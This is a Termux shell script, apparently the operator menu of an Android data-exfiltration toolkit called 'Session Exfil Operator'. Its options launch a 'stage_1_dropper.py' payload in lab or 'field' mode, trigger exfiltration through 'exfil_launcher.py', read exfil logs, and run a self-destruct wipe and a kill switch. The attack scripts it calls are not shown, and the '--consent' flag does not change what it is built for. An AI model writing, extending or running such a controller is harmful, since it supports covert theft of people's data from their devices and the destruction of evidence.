#!/data/data/com.termux/files/usr/bin/bash

EXFIL_PATH="$HOME/exfil"
LOG_PATH="$EXFIL_PATH/.logs/exfil.log"
CONSENT_FLAG="--consent"

function header() {
    echo -e "\e[1;36m┌──────────────────────────────┐"
    echo -e "│  Session Exfil Operator      │"
    echo -e "└──────────────────────────────┘\e[0m"
}

function menu() {
    header
    echo -e "[1] Deploy Payload (Lab Mode)"
    echo -e "[2] Deploy Payload (Field Mode)"
    echo -e "[3] Trigger Manual Exfil"
    echo -e "[4] View Logs"
    echo -e "[5] Wipe / Self-Destruct"
    echo -e "[6] Kill-Switch Trigger"
    echo -e "[0] Exit"
    echo -n "Select > "
    read opt
}

function run_script() {
    local file="$1"
    shift
    local args="$@"

    echo -e "\n[*] Running: $file $args\n"
    if [[ ! -f "$EXFIL_PATH/$file" ]]; then
        echo "[!] Script not found: $EXFIL_PATH/$file"
    else
        python3 "$EXFIL_PATH/$file" $args
        echo -e "\n[⇧] Exit code: $?\n"
    fi
    echo ""
    read -p "Press Enter to return to menu..."
}

while true; do
    clear
    menu
    case $opt in
        1)
            run_script "stage_1_dropper.py" --lab $CONSENT_FLAG
            ;;
        2)
            run_script "exfil_launcher.py" --field $CONSENT_FLAG
            ;;
        3)
            run_script "exfil_launcher.py" $CONSENT_FLAG
            ;;
        4)
            echo -e "\n[*] Viewing Log: $LOG_PATH"
            [[ -f "$LOG_PATH" ]] && cat "$LOG_PATH" || echo "[!] Log not found."
            echo ""
            read -p "Press Enter to return to menu..."
            ;;
        5)
            echo -e "\n[*] Executing Self-Destruct...\n"
            bash "$EXFIL_PATH/self_destruct_loader.sh"
            read -p "Press Enter to return to menu..."
            ;;
        6)
            run_script "exfil_launcher.py" --kill $CONSENT_FLAG
            ;;
        0)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "[!] Invalid option"
            read -p "Press Enter to continue..."
            ;;
    esac
done
